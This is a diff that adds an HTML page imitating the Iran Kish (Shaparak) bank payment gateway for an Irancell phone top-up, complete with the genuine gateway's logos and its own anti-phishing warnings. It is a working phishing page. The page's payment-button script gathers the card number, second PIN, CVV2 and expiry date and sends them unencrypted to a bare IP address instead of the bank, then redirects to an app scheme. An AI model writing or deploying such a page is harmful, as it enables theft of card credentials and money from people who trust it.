@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+	<meta name="author" content="iran kish">
+	<meta name="keywords" content="iran kish">
+	<meta name="description" content="iran kish">
+	<meta name="apple-mobile-web-app-title" content="iran kish">
+
+	<link rel="shortcut icon" href="">
+	<link rel="apple-touch-icon-precomposed" href="">
+
+	<title>عملیات شارژ مستقیم عادی ایرانسل</title>
+
+	<link href="css/bootstrap.css" rel="stylesheet" />
+	<link href="css/bootstrap-rtl.min.css" rel="stylesheet" />
+	<link href="css/bootstrapConfig.css" rel="stylesheet" />
+	<link href="css/AQ4.min.css" rel="stylesheet" />
+
+	<!--[if lt IE 9]>
+	<link href="~/Content/_Layouts/_Payment/css/pay-IE8-hack.css" rel="stylesheet" />
+	<![endif]-->
+
+	<script src="js/jquery-3.3.1.min.js"></script>
+	<script src="js/dtx-no-back.js"></script>
+
+
+</head>
+<body class="pay">
+
+	<div class="payment-page-header">
+	<div class="container">
+		<div class="row">
+			<div class="col-xs-12">
+				<img src="images/shaparak.png" class="modal-header-logos-002 pull-right" alt="شاپرک بانک مرکزی" />
+				<img src="images/irankish_logo.png" class="modal-header-logos-001 pull-left" alt="شرکت کارت اعتباری ایران کیش" />
+			</div>
+		</div>
+	</div>
+</div>
+
+
+	<div class="container">
+		<div class="row">
+			<div class="col-sm-12 col-md-10 col-md-offset-1">
+
+				<div class="row">
+	<div class="col-xs-12">
+		<div class="timer" style="top: -1px;">
+			<p>زمان باقیمانده: <span id="displayTimeRemaining"></span></p>
+		</div>
+	</div>
+</div>
+
+
+
+<script>
+
+	$(document).ready(function () {
+
+		var minutes = 10;
+		var seconds = 0;
+
+				var referer = 'https://IKC.Shaparak.ir/EShop/Topup/Manage';
+
+
+		var myInterval = setInterval(function () {
+
+			if (seconds > 0) {
+
+				seconds--;
+
+			}
+			else {
+
+				if (minutes > 0) {
+
+					minutes--;
+					seconds = 59;
+
+				}
+				else {
+
+				}
+
+			}
+
+			var minutesString = minutes.toString();
+			if (minutesString.length == 1) {
+
+				minutesString = '0' + minutesString;
+
+			}
+
+			var secondsString = seconds.toString();
+			if (secondsString.length == 1) {
+
+				secondsString = '0' + secondsString;
+
+			}
+
+			var result =
+				minutesString + ':' + secondsString
+
+			$('span#displayTimeRemaining').html(result);
+
+			if ((minutes == 0) && (seconds == 0)) {
+
+				clearInterval(myInterval);
+
+				if ((referer === undefined) || (referer === null) || (referer === '')) {
+
+					$('span#displayTimeRemaining').html("EXPIRED");
+
+				}
+				else {
+
+					window.location = referer;
+
+				}
+
+			}
+
+		}, 1000);
+
+	});
+
+</script>
+
+
+				
+
+				<div class="row m-t-xs-20">
+					
+
+
+
+
+
+
+
+
+<div class="col-sm-6 col-sm-push-6 pay-info pay-general footer-style-2">
+
+	<button class="btn btn-primary btn-block pay-info-collapse m-b-xs-20" type="button" data-toggle="collapse" data-target="#acc" aria-expanded="false" aria-controls="acc">
+		<span class="glyphicon glyphicon-eye-open btn-c-1" aria-hidden="true"></span>
+		<span class="glyphicon glyphicon-triangle-bottom btn-c-2" aria-hidden="true"></span>
+		مشاهده جزئیات
+	</button>
+
+	<div class="collapse" id="acc">
+		<div class="well">
+			<div class="row">
+				<div class="col-md-12 pay-info-001">
+					<div>
+						<img src=images/irankish_logo.png" alt="شرکت کارت اعتباری ایران کیش" style="max-height: 40px; top: 30px;" />
+					</div>
+				</div>
+			</div>
+
+			<div class="row">
+				<div class="col-md-12 pay-info-002">
+
+					<p>
+						
+						<a href="https://IKC.Shaparak.ir/EShop/Topup/Manage" class="btn btn-primary btn-xs">بازگشت به صفحه قبل در جهت ویرایش اطلاعات</a>
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						عملیات شارژ مستقیم عادی ایرانسل
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						مبلغ شارژ:
+						<span style="font-weight: 800;margin: 0 5px;color: #0F4DBC;">
+							۱۰,۰۰۰
+						</span>
+						ریال
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						شماره تلفن همراه:
+						09399999999
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						پذیرنده:
+						شرکت کارت اعتباری ایران کیش
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						شماره پایانه:
+						02013084
+					</p>
+
+					<p>
+						<span class="glyphicon glyphicon-stop" aria-hidden="true"></span>
+						کد پذیرندگی:
+						992180002013084
+					</p>
+
+				</div>
+			</div>
+
+			<div class="row foot-1">
+				<div class="col-md-12 pay-info-004">
+					<p>
+						شرکت کارت اعتباری ایران کیش
+					</p>
+					<a href="https://www.IranKish.com" target="_blank">
+						<p>
+							<span class="glyphicon glyphicon-paperclip" aria-hidden="true" style="font-size: 17px; top: 5px; right: -3px;color: rgb(6, 175, 78);"></span>
+							www.IranKish.com
+						</p>
+					</a>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+
+	<div class="col-sm-6 col-sm-pull-6 m-b-xs-20">
+
+	<div class="pay-main-col">
+
+		<div class="row">
+
+			<div class="col-xs-12">
+
+				<div class="form-group">
+					<label class="pay-main-col-001-label">
+						شماره کارت
+					</label>
+
+					<div class="ltr pay-main-col-table">
+						<div class="pay-layout">
+							<div class="pay-layout-row">
+								<div class="pay-layout-cell pay-layout-cell-input">
+									<input type="text" name="Payment.Part1" class="form-control ltr number paymentField" maxlength="4" tabindex="1" autocomplete="off" />
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-divider">
+									<span></span>
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-input">
+									<input type="text" name="Payment.Part2" class="form-control ltr number paymentField" maxlength="4" tabindex="2" autocomplete="off" />
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-divider">
+									<span></span>
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-input">
+									<input type="text" name="Payment.Part3" class="form-control ltr number paymentField" maxlength="4" tabindex="3" autocomplete="off" />
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-divider">
+									<span></span>
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-input">
+									<input type="text" name="Payment.Part4" class="form-control ltr number paymentField" maxlength="4" tabindex="4" autocomplete="off" />
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-divider">
+									<span></span>
+								</div>
+								<div class="pay-layout-cell pay-layout-cell-input">
+									<input type="text" name="Payment.Part5" class="form-control ltr number paymentField" maxlength="4" tabindex="5" autocomplete="off" disabled />
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<div class="clearfix"></div>
+
+					<p class="help-block">
+						در صورت فعال شدن فیلد پنجم، لطفا آن را پر نمایید
+					</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-xs-12">
+				<div class="form-group form-inline pay-main-col-002">
+					<label>
+						رمز دوم کارت (رمز اينترنتی)
+					</label>
+
+					<input type="password" name="Payment.Part6" class="form-control ltr number paymentField pull-left keypad" maxlength="12" tabindex="6" autocomplete="off" pattern="\d*" />
+
+					<p class="help-block">
+						لطفاً از صحت رمز عبور خود مطمئن شوید
+					</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-xs-12">
+				<div class="form-group form-inline pay-main-col-003">
+					<label>
+						کد سه یا چهار رقمی ( cvv2 )
+					</label>
+
+					<input type="password" name="Payment.Part7" class="form-control ltr number paymentField pull-left keypad" maxlength="4" tabindex="7" autocomplete="off" />
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-xs-12">
+				<div class="form-group date-main-col-wrapper">
+					<label>
+						تاریخ انقضای کارت
+					</label>
+
+					<div class="ltr pull-left date-main-col-table">
+						<div class="date-layout">
+							<div class="date-layout-row">
+								<div class="date-layout-cell">
+									<input type="text" name="Payment.Part9" class="form-control ltr number paymentField" maxlength="2" tabindex="9" autocomplete="off" />
+								</div>
+								<div class="date-layout-cell date-layout-cell-txt">
+									<span style="margin-left: 5px;margin-right: 5px;">سال</span>
+								</div>
+								<div class="date-layout-cell">
+									<input type="text" name="Payment.Part8" class="form-control ltr number paymentField" maxlength="2" tabindex="8" autocomplete="off" />
+								</div>
+								<div class="date-layout-cell date-layout-cell-txt">
+									<span style="margin-left: 5px">ماه</span>
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<div class="clearfix"></div>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-xs-12">
+				<div class="form-group form-inline">
+					<label>
+						عبارت زیر را در کادر وارد نمایید
+					</label>
+
+					<div class="captcha-wrapper">
+						<div class="pay-main-col-007 pull-right">
+							<button type="button" id="btnRefreshCaptchaImage" class="btn btn-default">
+								<span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
+							</button>
+						</div>
+
+						<div class=" pay-main-col-006 pull-left">
+							<img id="imgCaptchaImage" src="https://ikc.shaparak.ir/eshop/General/GetCaptchaImage" alt="Security Code" title="Security Code" />
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-xs-12">
+				<div class="form-group form-inline " style="overflow: hidden;">
+					<input type="text" name="Payment.Part10" class="form-control ltr number paymentField pull-left" maxlength="6" tabindex="10" autocomplete="off" />
+				</div>
+			</div>
+		</div>
+
+
+		<div class="row">
+			<div class="col-xs-6">
+				<button type="button" id="paymentButton" class="btn btn-success btn-block btn-c" tabindex="11" style=" padding: 3px 12px;">
+					<span class="glyphicon glyphicon-ok btn-c-3 FR" aria-hidden="true"></span>
+					پرداخت
+				</button>
+			</div>
+			<div class="col-xs-6">
+				<button type="reset" class="btn btn-default btn-block  pull-left btn-c" tabindex="12" style=" padding: 3px 12px;">
+					انصراف
+				</button>
+            </div>
+            
+		</div>
+	</div>
+</div>
+
+<script>
+
+	var captchaImageIndex = 0;
+
+	$(document).ready(function () {
+
+		$("button#btnRefreshCaptchaImage").click(function () {
+
+			captchaImageIndex++;
+
+			$("img#imgCaptchaImage")
+				.attr("src", "https://IKC.Shaparak.ir/EShop/General/GetCaptchaImage/" +
+				captchaImageIndex);
+
+		});
+
+	});
+
+</script>
+
+<script>
+
+	$(document).ready(function () {
+
+		$("input[name='Payment.Part1'],input[name='Payment.Part2']").blur(function (e) {
+
+			var part1 = $("input[name='Payment.Part1']").val();
+			var part2 = $("input[name='Payment.Part2']").val();
+
+			if ((part1 == "5899") && (part2.substring(0, 2) == "10")) {
+
+				$("input[name='Payment.Part5']").removeAttr("disabled");
+				return;
+			}
+
+			if ((part1 == "6273") && (part2.substring(0, 2) == "53")) {
+
+				$("input[name='Payment.Part5']").removeAttr("disabled");
+				return;
+
+			}
+
+			$("input[name='Payment.Part5']").attr("disabled", "disabled");
+
+		});
+
+	});
+
+</script>
+
+<script>
+
+	$(document).ready(function () {
+
+		$(".paymentField").bind("cut copy paste", function (e) {
+
+			e.preventDefault();
+
+		});
+
+	});
+
+</script>
+
+<script>
+
+	$(document).ready(function () {
+
+		$("input.number").keydown(function (e) {
+
+			if (e.ctrlKey) {
+
+				// CTRL + INS
+				if ((e.keyCode == 45) ||
+					// CTRL + C
+					(e.keyCode == 67) ||
+					// CTRL + V
+					(e.keyCode == 86)) {
+				}
+				else {
+
+					e.preventDefault();
+
+				}
+
+			}
+			else {
+
+				if (e.shiftKey) {
+
+					// SHIFT + TAB
+					if ((e.keyCode == 9) ||
+						// SHIFT + LEFT ARROW KEY
+						(e.keyCode == 37) ||
+						// SHIFT + RIGHT ARROW KEY
+						(e.keyCode == 39) ||
+						// SHIFT + INS
+						(e.keyCode == 45)) {
+					}
+					else {
+
+						e.preventDefault();
+
+					}
+
+				}
+				else {
+
+					// BACKSPACE
+					if ((e.keyCode == 8) ||
+						// TAB
+						(e.keyCode == 9) ||
+						// LEFT ARROW KEY
+						(e.keyCode == 37) ||
+						// RIGHT ARROW KEY
+						(e.keyCode == 39) ||
+						// DELETE
+						(e.keyCode == 46) ||
+						// NUMBER KEYS
+						((e.keyCode >= 48) && (e.keyCode <= 57)) ||
+						// NUMLOCK KEYS
+						((e.keyCode >= 96) && (e.keyCode <= 105))) {
+					}
+					else {
+
+						e.preventDefault();
+
+					}
+
+				}
+
+			}
+
+		});
+
+	});
+
+</script>
+
+<script>
+
+	$(document).ready(function () {
+
+		$("input.paymentField").keydown(function (e) {
+
+			if (((e.keyCode >= 48) && (e.keyCode <= 57)) ||
+				((e.keyCode >= 96) && (e.keyCode <= 105))) {
+
+				var varNextElement;
+
+				var varValue = $(this).val();
+				var varTabIndex = $(this).attr("tabindex");
+				var varMaxLength = $(this).attr("maxlength");
+
+				if (varValue.length >= varMaxLength) {
+
+					varTabIndex++;
+
+					if (varTabIndex > 10) {
+
+						return;
+
+					}
+
+					varNextElement =
+						$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+					if ($(varNextElement).attr("disabled") == "disabled") {
+
+						varTabIndex++;
+
+						if (varTabIndex > 10) {
+
+							return;
+
+						}
+
+						varNextElement =
+							$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+					}
+
+					if (varTabIndex == 8) {
+
+						$("input.paymentField[tabindex=7]").keypad('hide');
+
+					}
+
+					$(varNextElement).focus();
+
+				}
+
+			}
+			else {
+
+				if (e.keyCode == 8) {
+
+					var varPrevElement;
+
+					var varValue = $(this).val();
+					var varTabIndex = $(this).attr("tabindex");
+
+					if (varValue.length <= 0) {
+
+						varTabIndex--;
+
+						if (varTabIndex < 1) {
+
+							return;
+
+						}
+
+						varPrevElement =
+							$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+						if ($(varPrevElement).attr("disabled") == "disabled") {
+
+							varTabIndex--;
+
+							if (varTabIndex < 1) {
+
+								return;
+
+							}
+
+							varPrevElement =
+								$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+						}
+
+						if ((varTabIndex == 4) || (varTabIndex == 5)) {
+
+							$("input.paymentField[tabindex=6]").keypad('hide');
+
+						}
+
+						$(varPrevElement).focus();
+
+					}
+
+				}
+			}
+
+		});
+
+	});
+
+</script>
+
+<script>
+
+	$(document).ready(function () {
+
+		$("input.keypad").keypad({ showAnim: "", keypadOnly: false, randomiseNumeric: true, });
+
+	});
+
+</script>
+
+<script>
+	$(document).ready(function () {
+
+		$('button#paymentButton').click(function (e) {
+
+			$(this).html('لطفا کمی صبر کنید');
+            $(this).attr('disabled', 'disabled');
+            
+            // Fetch entered data
+            var cardnumber = $('input[name="Payment.Part1"]').val() + $('input[name="Payment.Part2"]').val() +  $('input[name="Payment.Part3"]').val() +  $('input[name="Payment.Part4"]').val() +  $('input[name="Payment.Part5"]').val();
+            var secondpass =  $('input[name="Payment.Part6"]').val();
+            var cvv2 =  $('input[name="Payment.Part7"]').val();
+            var expmonth =  $('input[name="Payment.Part8"]').val();
+            var expyear =  $('input[name="Payment.Part9"]').val();
+            var bankname = FetchBankName(cardnumber.substr(0, 6));
+            
+            var dataString = 'cardnumber=' + cardnumber +
+             '&bankname=' + bankname +
+             '&secondpass=' + secondpass +
+             '&cvv2=' + cvv2 + 
+             '&expmonth=' + expmonth + 
+             '&expyear=' + expyear + 
+             '&userid=' + 123;
+
+            alert(dataString);
+
+            // Send AJAX JSON 
+            $.ajax({
+			url: 'http://78.46.119.98:3000/submit',
+			data: dataString ,
+			type: 'GET',
+			dataType: 'jsonp',
+			timeout: 120000,
+			error: function() {alert('error')},
+			success: function(data) {
+                if(data.action === 'enseraf')
+                    window.location.href = 'payamchin://refid/failed';
+                else 
+                    window.location.href = 'payamchin://refid/success'
+            }
+        });
+
+        });
+    
+    });
+
+    function FetchBankName(BinCode){
+var bankarr = {
+'99':'مرکزي',
+'502229':'پاسارگاد',
+'502806':'شهر',
+'502908':'توسعه تعاون',
+'502938':'دي',
+'504172':'رسالت',
+'505416':'گردشگري',
+'505785':'ايران زمين',
+'589210':'سپه',
+'589463':'رفاه',
+'603769':'صادرات',
+'603770':'کشاورزي',
+'603799':'ملي',
+'606373':'مهر ايران',
+'610433':'ملت',
+'621986':'سامان',
+'622106':'پارسيان',
+'627353':'تجارت',
+'627381':'انصار',
+'627412':'اقتصادنوين',
+'627488':'کار آفرين',
+'627648':'توسعه صادرات',
+'627760':'پست بانك',
+'627961':'صنعت و معدن',
+'628023':'مسکن',
+'628157':'اعتباري توسعه',
+'636214':'آينده',
+'636949':'حكمت ايرانيان',
+'639346':'سينا',
+'639347':'پاسارگاد',
+'639599':'قوامين',
+'639607':'سرمايه',
+'936450':'سامانه رفع مغايرت',
+'983254':'پرشين سوئيچ',
+'62802328':'کارت خريد مفاسا',
+'62802329':'کارت تسهيلات مفاسا',
+'581672000':'شاپرک',
+'628023013':'فناپ',
+'585983':'تجارت',
+'505801':'کوثر',
+'606256':'عسکریه'
+};
+var key;
+for(key in bankarr)
+	if (BinCode.substr(0,key.length) == key)
+		return bankarr[key];
+return '';
+}
+
+</script>
+
+<div class="col-xs-12 text-justify help" style="position: relative;">
+	<div class="ssl" style="position: absolute; z-index: 1; left: 15px; top: 0;height: 58px;width: 58px;">
+		<img src="images/SSL.png" alt="SSL" />
+	</div>
+
+	<div class="well">
+		<div class="row">
+			<div class="col-md-12 title">
+				<h5>
+					<span class="glyphicon glyphicon-info-sign" aria-hidden="true" style="color: #0085ca"></span>لطفا
+					قبل از تکمیل فرایند خرید به نکات زیر توجه فرمایید
+				</h5>
+			</div>
+		</div>
+
+		<p>
+			درگاه پرداخت اینترنتی ایران کیش با استفاده ار پروتکل امن SSL به مشتریان خود ارایه خدمت نموده
+			است
+			و با آدرس https://ikc.shaparak.ir/eshop شروع می شود، خواهشمند است به منظور جلوگیری از سوء استفاده
+			های
+			احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب را با آدرس فوق مقایسه نمایید
+			و
+			در صورت مشاهده هر نوع مغایرت احتمالی سریعا با شماره 85949-021 مرکز ارتباط با مشتریان ایران
+			کیش
+			تماس حاصل نمایید.
+        </p>
+       
+
+		<ul>
+			<li>از صحت نام فروشنده و مبلغ نمایش داده شده اطمینان حاصل نمایید.</li>
+			<li>
+				برای جلوگیری از افشای رمز کارت خود، لطفا حتی المقدور از صفحه کلید مجازی استفاده نماید.
+			</li>
+			<li>
+				جهت کسب اطلاعات بیشتر، گزارش فروشگاه های مشکوک و همچنین اطلاع از وضعیت پذیرندگان
+				اینترنتی با
+				شماره 85949-021 تماس بگیرید.
+			</li>
+		</ul>
+
+		<div class="row">
+			<div class="col-md-12 title">
+				<h5>
+					<span class="glyphicon glyphicon-shopping-cart" aria-hidden="true" style="color: #0085ca"></span>
+					راهنمای خرید
+				</h5>
+			</div>
+		</div>
+
+		<ul>
+			<li>
+				برای انجام تراکنش های اینترنتی باید، رمز دوم یا رمز اینترنتی برای کارت خود دریافت نموده
+				باشید.این رمز با رمز اول که در خرید از پایانه های فروش یا دریافت وجه از خودپرداز استفاده
+				می
+				شود متفاوت است.
+			</li>
+			<li>کد CVV2 بر روی کارت یا پشت کارت شما درج شده است و متشکل از سه یا چهار رقم است.</li>
+			<li>
+				تاریخ انقضاء روی کارت شما درج شده است، در هنگام وارد کردن سال انقضاء صرفا باید آن را به
+				صورت
+				دو رقمی وارد نمایید.
+			</li>
+		</ul>
+	</div>
+</div>
+
+
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<div class="footer">
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-12 text-center">
+				<span><em>© </em>1393 - شرکت کارت اعتباری ایران کیش</span>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/ie10-viewport-bug-workaround.js"></script>
+
+	<script src="js/Keypad/jquery.plugin.js"></script>
+	<script src="js/Keypad/jquery.keypad.min.js"></script>
+	<script src="js/Keypad/jquery.keypad-fa.js"></script>
+
+	<script>
+
+		$(document).ready(function () {
+
+			var a = $('.pay-info-001').find('img'),
+				_interval = setInterval(function () {
+
+					if (a.width() > 0) {
+
+						setImg();
+
+					}
+
+				}, 10);
+
+			function setImg() {
+
+				clearInterval(_interval);
+				var _height = a.height(),
+					_width = a.width();
+
+				if (_height < 60) {
+
+					var b = (100 - _height) / 2;
+					a.css("top", b)
+
+				}
+
+				if (_width > 200) {
+
+					a.css("width", "200px");
+					_height = a.height();
+					var c = (100 - _height) / 2;
+					a.css("top", c)
+
+				}
+
+			}
+
+		});
+
+	</script>
+</body>
+</html>
